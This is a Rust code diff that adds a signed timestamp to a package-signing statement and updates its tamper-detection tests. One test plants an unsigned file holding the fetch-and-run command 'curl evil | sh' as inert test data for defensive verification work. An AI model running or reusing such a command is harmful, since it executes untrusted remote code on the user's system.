@@ -111,6 +111,14 @@ pub struct SignedStatement {
     pub namespace: String,
     /// The version this release claims.
     pub version: String,
+    /// Unix seconds when this was signed.
+    ///
+    /// Inside the signed bytes, and that is the whole point: expiry and
+    /// revocation both ask "when was this made", so a timestamp an attacker
+    /// could edit would let them dodge an expired delegation or a revoked
+    /// key by moving one number. A verifier still decides nothing from this
+    /// alone -- it is what the delegation window is measured against.
+    pub signed_at: u64,
     /// Every entry in the bundle, sorted by path.
     pub entries: Vec<CoveredEntry>,
     /// The layered identities, so a verifier can tell WHICH kind of change it
@@ -130,6 +138,7 @@ impl SignedStatement {
     pub fn build(
         namespace: &str,
         version: &str,
+        signed_at: u64,
         entries: &BTreeMap<String, Vec<u8>>,
     ) -> SignedStatement {
         let covered = entries
@@ -150,6 +159,7 @@ impl SignedStatement {
             schema: STATEMENT_SCHEMA.to_string(),
             namespace: namespace.to_string(),
             version: version.to_string(),
+            signed_at,
             entries: covered,
             execution_digest: provenance::digest_layer(Layer::Execution, entries).digest,
             project_digest: provenance::digest_layer(Layer::Project, entries).digest,
@@ -173,6 +183,7 @@ impl SignedStatement {
         field(&mut out, self.schema.as_bytes());
         field(&mut out, self.namespace.as_bytes());
         field(&mut out, self.version.as_bytes());
+        out.extend_from_slice(&self.signed_at.to_le_bytes());
         field(&mut out, self.execution_digest.as_bytes());
         field(&mut out, self.project_digest.as_bytes());
 
@@ -314,6 +325,11 @@ fn hex(bytes: &[u8]) -> String {
 mod tests {
     use super::*;
 
+    /// A fixed signing time. Tests must never read the clock: a test whose
+    /// answer depends on when it runs is a test that fails one day for a
+    /// reason nobody can reproduce.
+    const SIGNED_AT_FIXTURE: u64 = 1_700_000_000;
+
     fn entries(pairs: &[(&str, &[u8])]) -> BTreeMap<String, Vec<u8>> {
         pairs
             .iter()
@@ -333,7 +349,7 @@ mod tests {
 
     #[test]
     fn every_entry_is_covered_with_its_role() {
-        let statement = SignedStatement::build("pub/notes", "1.0.0", &sample());
+        let statement = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &sample());
         let roles: Vec<_> = statement
             .entries
             .iter()
@@ -354,8 +370,8 @@ mod tests {
 
     #[test]
     fn the_same_statement_always_serializes_to_the_same_bytes() {
-        let one = SignedStatement::build("pub/notes", "1.0.0", &sample());
-        let two = SignedStatement::build("pub/notes", "1.0.0", &sample());
+        let one = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &sample());
+        let two = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &sample());
         assert_eq!(one.canonical_bytes(), two.canonical_bytes());
     }
 
@@ -363,16 +379,18 @@ mod tests {
     /// change meaning must change the bytes.
     #[test]
     fn changing_anything_that_matters_changes_the_signed_bytes() {
-        let base = SignedStatement::build("pub/notes", "1.0.0", &sample());
+        let base = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &sample());
 
-        let other_namespace = SignedStatement::build("someone-else/notes", "1.0.0", &sample());
+        let other_namespace =
+            SignedStatement::build("someone-else/notes", "1.0.0", SIGNED_AT_FIXTURE, &sample());
         assert_ne!(
             base.canonical_bytes(),
             other_namespace.canonical_bytes(),
             "a different publisher is a different statement"
         );
 
-        let other_version = SignedStatement::build("pub/notes", "1.0.1", &sample());
+        let other_version =
+            SignedStatement::build("pub/notes", "1.0.1", SIGNED_AT_FIXTURE, &sample());
         assert_ne!(
             base.canonical_bytes(),
             other_version.canonical_bytes(),
@@ -383,7 +401,8 @@ mod tests {
         changed.insert("code.wasm".into(), b"\0asm-different".to_vec());
         assert_ne!(
             base.canonical_bytes(),
-            SignedStatement::build("pub/notes", "1.0.0", &changed).canonical_bytes(),
+            SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &changed)
+                .canonical_bytes(),
         );
     }
 
@@ -392,8 +411,8 @@ mod tests {
     /// begins.
     #[test]
     fn fields_cannot_be_reinterpreted_by_shifting_a_boundary() {
-        let a = SignedStatement::build("ab", "c", &BTreeMap::new());
-        let b = SignedStatement::build("a", "bc", &BTreeMap::new());
+        let a = SignedStatement::build("ab", "c", SIGNED_AT_FIXTURE, &BTreeMap::new());
+        let b = SignedStatement::build("a", "bc", SIGNED_AT_FIXTURE, &BTreeMap::new());
         assert_ne!(
             a.canonical_bytes(),
             b.canonical_bytes(),
@@ -404,7 +423,7 @@ mod tests {
     #[test]
     fn a_statement_matches_the_bundle_it_was_built_from() {
         let bundle = sample();
-        let statement = SignedStatement::build("pub/notes", "1.0.0", &bundle);
+        let statement = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &bundle);
         assert!(statement.check_against(&bundle).is_empty());
     }
 
@@ -413,7 +432,7 @@ mod tests {
     #[test]
     fn a_file_nobody_signed_for_is_refused() {
         let signed = sample();
-        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);
+        let statement = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &signed);
 
         let mut tampered = signed.clone();
         tampered.insert("extra/payload.sh".into(), b"curl evil | sh".to_vec());
@@ -434,7 +453,8 @@ mod tests {
     fn records_this_version_does_not_understand_are_still_covered() {
         let mut with_future = sample();
         with_future.insert("future/thing.bin".into(), b"v2 data".to_vec());
-        let statement = SignedStatement::build("pub/notes", "1.0.0", &with_future);
+        let statement =
+            SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &with_future);
         let unknown = statement
             .entries
             .iter()
@@ -457,7 +477,7 @@ mod tests {
     #[test]
     fn a_changed_file_is_named_with_the_part_it_plays() {
         let signed = sample();
-        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);
+        let statement = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &signed);
         // Same LENGTH, different bytes -- the case a size check cannot catch,
         // and the reason the digest is compared at all.
         let mut tampered = signed.clone();
@@ -483,7 +503,7 @@ mod tests {
     #[test]
     fn a_removed_file_is_reported_as_missing_not_as_a_pass() {
         let signed = sample();
-        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);
+        let statement = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &signed);
         let mut stripped = signed.clone();
         stripped.remove("sdk/krate.wit");
         assert_eq!(
@@ -499,7 +519,7 @@ mod tests {
     #[test]
     fn all_discrepancies_are_reported_together() {
         let signed = sample();
-        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);
+        let statement = SignedStatement::build("pub/notes", "1.0.0", SIGNED_AT_FIXTURE, &signed);
         let mut wrecked = signed.clone();
         wrecked.remove("assets/logo.png");
         wrecked.insert("code.wasm".into(), b"\0asm-swapped!".to_vec());
